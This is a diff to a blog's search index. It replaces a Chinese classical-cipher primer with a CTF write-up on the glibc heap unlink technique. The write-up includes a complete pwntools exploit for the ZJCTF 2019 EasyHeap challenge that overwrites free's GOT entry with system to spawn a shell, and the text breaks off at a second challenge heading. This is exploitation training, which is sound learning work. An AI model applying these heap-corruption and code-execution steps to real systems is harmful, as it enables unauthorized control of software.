@@ -1,134 +1,190 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>古典密码</title>
-    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h1>Crypto入门之古典篇</h1>
-<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
-<blockquote>
-<ul>
-<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
-</ul>
-</blockquote>
-   <span id="more"></span>
-<p>古典密码通常极容易破解，大部分经典密码都很容易受到唯密文攻击法攻击（cipher text only attack）。而像凯撒这种密钥数有限的密码则容易受到爆破密钥的方式破解，替代式密码有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。多字母替代式密码密码，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。<br>
-所以，在主流的CTF比赛中，一般不会把某种古典密码作为一个题目的核心知识点来考，在比赛中遇到时，一般在搜索引擎中搜索就可以解决。</p>
-<h2 id="2-编码"><a class="header-anchor" href="#2-编码">¶</a>2.编码</h2>
-<h3 id="2-1-base编码"><a class="header-anchor" href="#2-1-base编码">¶</a>2.1 base编码</h3>
-<pre><code>Base64
-    Base64是目前网络上最常见的用于传输8bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。在编码时，3个字节的数据先后（先来的字节占高位）放入一个24位的缓冲区，数据不足3字节时则用0来补足。每次选出6bit按照其值来选择 &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 中的字符作为编码输出，若原数据长度len mod 3 = 1 则在编码后加两个&quot;=&quot;,若len mod 3 =2 则加一个&quot;=&quot;,而当刚好为3的倍数时则不会出现等号，如下图。从下图中不难发现当原数据长度不为3的倍数时，在编码时会再末位补0使其成为6的倍数，而在解码时会自动去掉所补的0，如果在编码的时候不全用0位填充而将我们想隐藏的数据放入其中，也并不会影响编码的结果，这就引出了另外一个CTF题型：Base64隐写。
+    <title>Unlink</title>
+    <url>/2021/10/04/Unlink/</url>
+    <content><![CDATA[<h1>Unlink</h1>
+<h2 id="原理介绍"><a class="header-anchor" href="#原理介绍">¶</a>原理介绍</h2>
+<h3 id="unlink"><a class="header-anchor" href="#unlink">¶</a>unlink</h3>
+<p>unlink其实进行脱链操作，下面贴一张CTF-wiki上的原理图</p>
+<span id="more"></span>
+<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
+<p>一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来，<br>
+然后和物理相邻的堆块合并成新的大堆块（向前合并/向后合并），最后再放入到<br>
+unsortedbin中</p>
+<h3 id="unlink-源码阅读"><a class="header-anchor" href="#unlink-源码阅读">¶</a>unlink 源码阅读</h3>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>在free当前堆块的是后，会先检查其物理相邻的前一个堆块是不是处于释放状态，如果处于free状态则进入判断</p>
+<p>将首先会提取当前堆块的前一个堆块的大小</p>
+<p>将当前堆块的size和前一个堆块的size相加，即合并</p>
+<p>将当前堆块的指针指向前一个堆块</p>
+<p>然后unlink，即将当前的P所指向的chunk从双链表中移除</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里会进行一个检查，判断FD的bk和BK的fd是否指向当前堆块</p>
+<h3 id="Unlink-的绕过和利用"><a class="header-anchor" href="#Unlink-的绕过和利用">¶</a>Unlink 的绕过和利用</h3>
+<p>step1:伪造fake chunk</p>
+<pre><code>chunk = 0x0602040
+P 为我们将要合并的地址,P存在于chunk中，且有*(chunk)=P
+P-&gt;fd = chunk - 0x18 = 0x602028
+P-&gt;bk = chunk - 0x10 = 0x602030
 </code></pre>
-<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
-<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
-<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
-<pre><code>其它Base编码
-    除了Base64以外，Baes32和Base16也是较为常见的Base编码，它们的编码原理和Basa64一样，后者Base16也是我们常说的Hex编码即16进制，除此之外还有Base58、Baes36、Base91、uuencode、xxencode等也曾出现在CTF的比赛中，它们原理类似，只不过它们使用的码表不同，而在比赛中也常有替换码表的Baes题目。
+<p>Step2: 绕过检查</p>
+<pre><code>Unlink(P,BK,FD)&#123;
+    FD = P-&gt;fd     // FD = 0x602028
+    BK = P-&gt;bk     // BK = 0x602030
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
+     // 检查绕过 FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
+     //绕过2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
+     FD-&gt;bk = BK //*(0x602040) = 0x602030
+     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
+    &#125;
+&#125;
 </code></pre>
-<h3 id="2-2-其他常见编码"><a class="header-anchor" href="#2-2-其他常见编码">¶</a>2.2 其他常见编码</h3>
-<pre><code>ASCII码：包含大小写字母，数字，常见符号等，是互联网通用语言
-摩斯电码：由点（.）、划（—）组成
-URL编码：又称百分号编码、只是简单的在特殊字符的各个字节前加上%
-jjencode&amp;aaencode:针对JS的编码方式，前者将JS代码转为符号和字符串、后者将之转换为常用网络表情
-一般地，编码只是对原始数据进行一定地处理，使其变得方便传输、储存等操作，并不是为了加密信息，也没有密钥等额外信息，只要知道编码方式就可以还原得到数据内容。
+<p>Step3: 劫持程序执行流</p>
+<pre><code>经过上述的步骤，我们已经实现了在*(chunk)中写入了chunk-0x18的值
+如过我向chunk - 0x18 写入__free_hook,在我下一次修改的时候就可以把__free_hook改写为system
 </code></pre>
-<h2 id="3-单表替换密码"><a class="header-anchor" href="#3-单表替换密码">¶</a>3.单表替换密码</h2>
-<h3 id="3-1单表替换原理"><a class="header-anchor" href="#3-1单表替换原理">¶</a>3.1单表替换原理</h3>
-<pre><code>单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的。
-例如源字母表为：abcdefghijklmnopqrstuvwxyz
-码表为：qwertyuiopasdfghjklzxcvbnm
-</code></pre>
-<p>加密：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#s为码表,m为密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解密：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
-<h3 id="凯撒密码"><a class="header-anchor" href="#凯撒密码">¶</a>凯撒密码</h3>
-<pre><code>凯撒密码是一种最为简单的替换密码，即字母表上的所有的字母向一个方向偏移n位后被替换为密文，如：当n=2时，A就被替换成了C，凯撒及其变种经常会出现在CTF古典密码学的题目中，其加解密公式为：
-</code></pre>
-<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
-<pre><code>    由此可以看出，当我们知道一串密文是由凯撒加密得来的时候，即使我们不知到密钥，也可以通过穷举法轻易的破解。
-</code></pre>
-<h3 id="仿射密码（Affine-cipher）"><a class="header-anchor" href="#仿射密码（Affine-cipher）">¶</a>仿射密码（Affine cipher）</h3>
-<pre><code>仿射密码作为一种单表替换密码，码表的每个字母相应的值使用一个简单的数学函数对应一个数值
-其加解密公式如下：
-</code></pre>
-<p>加密：<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
-解密：<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
-乘法逆元求法：<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
-<em><strong>关于公式</strong></em></p>
-<pre><code>a与m互素，m=26,x为原文，b为偏移量
-</code></pre>
-<p><em><strong>关于乘法逆元</strong></em></p>
-<pre><code>    例如，求5关于模14的乘法逆元：14=5*2+4，5=4*1+1说明5与14互素，存在5关于14的乘法逆元。1=5-4=5-(14-5*2)=5*3-14因此，5关于模14的乘法逆元为3。
-</code></pre>
-<p><em><strong>破解</strong></em></p>
-<pre><code>若a=1,则刚好就是凯撒密码。
-若a!=1,我们可以知道m=26，a与m互素，即可得到的取值范围为：1，3，5，7，9，11，13，15，17，19，21，23，25中的一个，所以一共有12*26=312种可能的密钥，此时采用穷举法即可攻击。
-若我们已经知道了两个加密后的字母c1,c2。那么通过公式c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;则c1-c2可得：c1-c2=a(x1-x2) mod m即可求解a，再用穷举法得到b。
-</code></pre>
-<h2 id="4-多表替换密码"><a class="header-anchor" href="#4-多表替换密码">¶</a>4.多表替换密码</h2>
-<h3 id="4-1多表替换原理"><a class="header-anchor" href="#4-1多表替换原理">¶</a>4.1多表替换原理</h3>
-<pre><code>由于单表替换密码容易被频率分析破解，人们提出了多表替换加密，即用多个码表来依次对明文消息的字母进行代换。相较于单表替换，多表替换后，密文几乎不再保持原来的频率，所以更加难以破解，我们一般只能通过寻找算法实现对应的弱点进行破解。在多表替换中，以Playfair、Vigenere、Nihilist、Hill等较为出名，这里我们指选择分析其中的几种。
-</code></pre>
-<h3 id="4-2autokey-维吉尼亚"><a class="header-anchor" href="#4-2autokey-维吉尼亚">¶</a>4.2autokey/维吉尼亚</h3>
-<pre><code>维吉尼亚密码，作为最经典的多表密码，其码表如下图：
-码表第一排对应明文，第一列对应密钥。例如：
-明文为：i like crypto
-密钥为：nssctf
-密文为：v damx heqhvh
-</code></pre>
-<p>破解<br>
-由于维吉尼亚密码属于多表加密，所以一个字母可能被加密成不同的密文，由于密钥是重复使用的，所以只要知道了密钥的长度，就可以将其看成是交织在一起的凯撒密码，每一个都可以单独破解。密钥长度可以使用卡西斯基试验来得到。</p>
-<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
-<pre><code>Autokey与维吉尼亚密码密码类似，自动密钥密码（Autokey）主要有两种，关键词自动密钥密码和原文自动密钥密码。所以它比维吉尼亚更加安全。下面我们以关键词自动密钥为例：
-明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
-关键词：CULTURE
-自动生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE
-密文：VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
-</code></pre>
-<h3 id="4-3希尔密码"><a class="header-anchor" href="#4-3希尔密码">¶</a>4.3希尔密码</h3>
-<pre><code>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。加密矩阵必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。
-</code></pre>
-<p>加密：<br>
-<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
-解密：<br>
-求出加密矩阵的逆矩阵然后同密文相乘后再对等到的矩阵模26(人懒就不上图了)</p>
-<h2 id="5-其他密码"><a class="header-anchor" href="#5-其他密码">¶</a>5.其他密码</h2>
-<h4 id="培根密码："><a class="header-anchor" href="#培根密码：">¶</a>培根密码：</h4>
-<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
-<h4 id="栅栏密码："><a class="header-anchor" href="#栅栏密码：">¶</a>栅栏密码：</h4>
-<pre><code>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。
-</code></pre>
-<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">¶</a>JSFuck:</h4>
-<p>形如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">原作者github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
-<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">¶</a>BrainFuck</h4>
-<pre><code>一种极小众的计算机语言，由“&gt;、&lt;、+、-、.、,、[、]&quot;八个符号组成。该语言由目前有专门的解释器，感兴趣可以自行了解。
-</code></pre>
-<h4 id="猪圈及其变形"><a class="header-anchor" href="#猪圈及其变形">¶</a>猪圈及其变形</h4>
-<pre><code>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。
-</code></pre>
-<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
-<h4 id="跳舞的小人"><a class="header-anchor" href="#跳舞的小人">¶</a>跳舞的小人</h4>
-<pre><code>出自《福尔摩斯》的密码
-</code></pre>
-<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
-<h4 id="来自宇宙的信号"><a class="header-anchor" href="#来自宇宙的信号">¶</a>来自宇宙的信号</h4>
-<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
-<h4 id="古精灵码"><a class="header-anchor" href="#古精灵码">¶</a>古精灵码</h4>
-<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
-<pre><code>除了以上列出来的这些，还有盲文、数字盲文、音符加密、01248、与佛论禅等也曾出现在CTF比赛中。
-</code></pre>
-<h3 id="6-常用网站"><a class="header-anchor" href="#6-常用网站">¶</a>6.常用网站</h3>
-<pre><code>http://ctf.ssleye.com/#
-https://quipqiup.com/
-</code></pre>
+<h2 id="列题"><a class="header-anchor" href="#列题">¶</a>列题</h2>
+<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">¶</a>ZJCTF 2019 EasyHeap</h3>
+<p>这道题网上的wp大多都是house of spirit 以及 Unsorted bin attack, 这里介绍一种Unlink的攻击方式</p>
+<h4 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h4>
+<p>add</p>
+<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
+<p>可以看到add是用一个heaparray的数组来管理堆块的</p>
+<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
+<p>edit</p>
+<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
+<p>delete</p>
+<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
+<p>同时该题也没开启PIE保护</p>
+<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
+<p>这题就非常适合利用Unlink手法来构造exp</p>
+<h4 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h4>
+<p>Step1:伪造fake chunk</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+<p>伪造后可以发现此时chunk0处于free状态</p>
+<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
+<p>此时我们释放掉堆块1，可以发现堆块0和堆块1成功合并，触发Unlink</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
+<p>Step2：任意地址写</p>
+<p>可以看到chunk0已经指向了0x6020c8,我们可以通过edit(0)为system最后getshell</p>
+<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
+<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">¶</a>hitcon2014_stkof</h3>
+<h4 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h4>
+<p>本题和上一题区别不大，唯一的区别就在于本题没有调用system函数，需要泄露libc地址</p>
+<p>即把free_got 改为 puts_plt即可泄露地址</p>
+<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
